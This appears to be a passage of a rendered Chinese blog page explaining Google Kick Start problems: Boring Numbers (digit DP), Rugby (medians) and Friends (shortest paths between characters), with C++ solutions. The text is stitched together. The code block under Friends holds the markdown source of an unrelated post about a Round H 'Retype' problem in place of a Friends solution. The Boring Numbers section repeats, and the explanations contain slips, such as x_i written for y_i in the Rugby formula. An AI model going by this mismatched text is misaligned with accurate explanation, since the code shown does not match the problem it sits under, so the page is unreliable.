dp[n][0] + dp[n][1] \\count[x] = \sum_{i=1}^{n-1}5^{i} + dp[n][0] + dp[n][1] \\</script></li></ul><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> cnt[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">20</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">count</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x = n; x != <span class="number">0</span>; x = x/<span class="number">10</span>)&#123;</span><br><span class="line">        arr.push_back(x%<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    reverse(arr.begin(),arr.end());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.size(); ++i)&#123;</span><br><span class="line">        ans += cnt[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> m = arr.size();</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)&#123;</span><br><span class="line">        <span class="comment">/*upper*/</span></span><br><span class="line">        <span class="keyword">if</span>((arr[i<span class="number">-1</span>]%<span class="number">2</span>) == (i%<span class="number">2</span>)) dp[i][<span class="number">0</span>] = dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/*lower*/</span></span><br><span class="line">        <span class="keyword">if</span>(i  &gt; <span class="number">1</span>) dp[i][<span class="number">1</span>] += dp[i<span class="number">-1</span>][<span class="number">1</span>]*<span class="number">5</span>;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">1</span>)&#123;</span><br><span class="line">            dp[i][<span class="number">1</span>] += arr[i<span class="number">-1</span>]/<span class="number">2</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; arr[i<span class="number">-1</span>]; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>((j%<span class="number">2</span>) == (i%<span class="number">2</span>)) dp[i][<span class="number">1</span>] += dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans += dp[m][<span class="number">0</span>];</span><br><span class="line">    ans += dp[m][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> l,r;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;l&gt;&gt;r;</span><br><span class="line">    ans = count(r) - count(l<span class="number">-1</span>);</span><br><span class="line">    <span class="comment">//cout&lt;&lt;count(r)&lt;&lt;":"&lt;&lt;count(l-1)&lt;&lt;endl;</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cnt[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">18</span>; ++i)&#123;</span><br><span class="line">        cnt[i] = cnt[i<span class="number">-1</span>]*<span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Rugby"><a href="#Rugby" class="headerlink" title="Rugby"></a>Rugby</h2><p>给定一堆坐标$(x_{i},y_{i})$,求将这些坐标变为一行的最小曼哈顿距离之和:<br>$(X,Y),(X+1,Y),(X+2,Y),(X+3,Y),(X+4,Y)…(X+N,Y)$.</p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 中位数。</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>我们仔细观察一下，实际上目标值的<code>(x,y)</code>实际上是独立的，相互之间不影响，则我们可以分别来求出<code>(X,Y)</code>。<script type="math/tex; mode=display">Target = min(\sum_{i=0}^{n-1}abs(x_{i}-X-i) + \sum_{i=0}^{n-1}abs(x_{i}-Y)</script></li><li>在已知条件下，我们很容易求出<code>y</code>的值，因为知道要满足距离之和最小的值为中位数。我们对所有坐标的纵坐标按照大小进行排序,<code>Y</code>即为排序后的中位数。<script type="math/tex; mode=display">Y = \frac{y_{\frac{n-1}{2}} + y_{\frac{n}{2}}}{2}</script></li><li>我们再来求<code>X</code>,我们同样也对<code>x</code>进行排序，我们需要求出$\sum_{i=0}^{n-1}abs(x_{i}-X-i)$的最小值，实际上可以转为$\sum_{i=0}^{n-1}abs((x_{i}-i) -X)$的最小值，因此我们此时构造数组：<script type="math/tex; mode=display">(x_{0},x_{1}-1,x_{2}-2,x_{3}-3...,x_{n}-n)</script>此时求最小距离之和可以转换为求中位数即可，满足题目要求，此时我们相当于求上述转化数组的中位数。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> midx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> midy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; arrx(n);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; arry(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;arrx[i]&gt;&gt;arry[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(arry.begin(),arry.end());</span><br><span class="line">    sort(arrx.begin(),arrx.end());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        arrx[i] -= i;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(arrx.begin(),arrx.end());</span><br><span class="line">    midx = (arrx[(n<span class="number">-1</span>)/<span class="number">2</span>] + arrx[n/<span class="number">2</span>])/<span class="number">2</span>;</span><br><span class="line">    midy = (arry[(n<span class="number">-1</span>)/<span class="number">2</span>] + arry[n/<span class="number">2</span>])/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        ans += <span class="built_in">abs</span>(arrx[i]-midx);</span><br><span class="line">        ans += <span class="built_in">abs</span>(arry[i]-midy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="Friends"><a href="#Friends" class="headerlink" title="Friends"></a>Friends</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给定图，图中的每个节点含有一个字符串，如果两个字符串<code>s,t</code>存在有相同字母，则认为两个节点存在相互连接的边，给定一组查询<code>(x,y)</code>，求节点<code>x</code>与<code>y</code>之间的最短路劲。</p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 图的遍历</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>题目挺有新意的，如果直接用<code>bfs</code>来遍历图的话，按照图中给定的数据集肯定会超时，所以必须要转换思路。</li><li>我们可以转换成求字符<code>a,b</code>的最短距离。我们可以求所所有字符的最短转移路劲，本题也就转化为求所有可能的字符的最短转换路径。</li><li>我们假设源字符串为<code>s</code>，目标字符串为<code>t</code>，假如<code>s</code>和<code>t</code>之间存在相同的字符<code>e</code>，则很容易我们知道直接跳一步即可得到结果,<code>chain</code>的最短长度应该为<code>2</code>。<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s-<span class="function"><span class="params">(e)</span>-&gt;</span>t</span><br></pre></td></tr></table></figure>假如<code>s</code>和<code>t</code>之间是通过不同的字符进行跳转得到的结果，且目标的最短的<code>chain</code>为：<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s-<span class="function"><span class="params">(c1)</span>-&gt;</span>s1-<span class="function"><span class="params">(c2)</span>-&gt;</span>s2-<span class="function"><span class="params">(c3)</span>-&gt;</span>s3-&gt;...<span class="function">-&gt;</span>sn-<span class="function"><span class="params">(cn)</span>-&gt;</span>t</span><br></pre></td></tr></table></figure>根据以上推论我们可以知道如果满足最短的<code>chain</code>，则必然可以得到以下结论:<script type="math/tex; mode=display">c_{1} \neq c_{2} \neq c_{3} \neq c_{4} \neq c_{5} .... \neq c_{n}</script>我们假设存在$c_{i} = c_{j}$,则我们可以判定直接可以通过<code>i</code>跳转到<code>j</code>即可，而不必再通过$c_{i+1},c_{i+2},…,c_{j-1}$进行跳转,因此我们只需求出不同字符之间跳转的最短距离即可。我们可以设相同字符的跳转距离为<code>0</code>.</li><li>我们可以很容易求出，两个字符串之间的字符跳转的最短转换距离，最终的答案为$minJump + 2$.<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 【google kickstart】  roundH</span><br><span class="line">tags: kickstart</span><br><span class="line">categories: 算法</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="meta"># google kickstart round H</span></span><br><span class="line">`google kick start`的题目果真经典并且又不失思考的乐趣，质量非常高的题目，我觉得思考的深度非常有代表性。</span><br><span class="line"></span><br><span class="line">## Problem A - Retype</span><br><span class="line">### 题目</span><br><span class="line">选择游戏重启的位置</span><br><span class="line">### 思路</span><br><span class="line"><span class="number">1.</span> 真心是送分问题，一共只有两种选择，要么从头开始，要么倒回到第`s`关开始。</span><br><span class="line">$$</span><br><span class="line">minT = k + min(n,k+n<span class="number">-2</span>*s)</span><br><span class="line">$$</span><br><span class="line">### 代码</span><br><span class="line">```c++</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;<span class="built_in">vector</span>&gt;</span><br><span class="line">#include&lt;<span class="built_in">set</span>&gt;</span><br><span class="line">#include&lt;<span class="built_in">unordered_set</span>&gt;</span><br><span class="line">#include&lt;<span class="built_in">map</span>&gt;</span><br><span class="line">#include&lt;<span class="built_in">unordered_map</span>&gt;</span><br><span class="line">#include&lt;<span class="built_in">string</span>&gt;</span><br><span class="line">#include&lt;<span class="built_in">stack</span>&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k,s;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k&gt;&gt;s;</span><br><span class="line">    ans = k + min(n,k+n<span class="number">-2</span>*s);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="Boring-Numbers-1"><a href="#Boring-Numbers-1" class="headerlink" title="Boring Numbers"></a>Boring Numbers</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><ul><li><code>boring number</code>定义：从高位开始，起始索引为<code>1</code>，奇数位的数字为奇数，偶数位的数字为偶数。<br>求给定范围$[L,R]$中<code>boring number</code>的个数<h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 数位<code>dp</code></p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3></blockquote></li></ul><ol><li>典型的可以用数位<code>dp</code>来解决该问题，我们可以转换思路，设<code>count(x)</code>表示从<code>1</code>到<code>x</code>之间的<code>boring number</code>的个数，则结果可以转化为:<script type="math/tex; mode=display">ans = count(R) - count(L-1)</script></li><li>难点在于求<code>count(x)</code>，我们可以将小于<code>x</code>的数字分为两种情况，一种为数字的位数与<code>x</code>相等用$X_{lower}$表示;另一种为数字的位数与<code>x</code>相等，用$X_{equal}$表示。<script type="math/tex; mode=display">n = bits(x) \\count[x] = X_{lower} + X_{equal} \\X_{lower} = \sum_{i=1}^{n-1}5^{i}</script></li></ol><ul><li>求$X_{equal}$稍微复杂点，我们设<code>dp[i][0]</code>表示字符的长度为<code>i</code>,且前<code>i</code>的数字与<code>x</code>相等且为<code>boring number</code>的个数，这个其实很简单，要么为<code>0</code>,要么为<code>1</code>；设<code>dp[i][1]</code>表示字符的长度为<code>i</code>,且前<code>i</code>的数字与<code>x</code>不相等且为<code>boring number</code>的个数，则此时:<script type="math/tex; mode=display">dp[i][1] = dp[i-1][1]*5 + dp[i-1][0]*(X[i]/2) \\X_{equal} = dp[n][0] + dp[n][1] \\count[x] = \sum_{i=1}^{n-1}5^{i} + dp[n][0] + dp[n][1] \\</script></li></ul><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> cnt[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">20</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">count</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x = n; x != <span class="number">0</span>; x = x/<span class="number">10</span>)&#123;</span><br><span class="line">        arr.push_back(x%<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    reverse(arr.begin(),arr.end());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.size(); ++i)&#123;</span><br><span class="line">        ans += cnt[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> m = arr.size();</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)&#123;</span><br><span class="line">        <span class="comment">/*upper*/</span></span><br><span class="line">        <span class="keyword">if</span>((arr[i<span class="number">-1</span>]%<span class="number">2</span>) == (i%<span class="number">2</span>)) dp[i][<span class="number">0</span>] = dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/*lower*/</span></span><br><span class="line">        <span class="keyword">if</span>(i  &gt; <span class="number">1</span>) dp[i][<span class="number">1</span>] += dp[i<span class="number">-1</span>][<span class="number">1</span>]*<span class="number">5</span>;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">1</span>)&#123;</span><br><span class="line">            dp[i][<span class="number">1</span>] += arr[i<span class="number">-1</span>]/<span class="number">2</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span 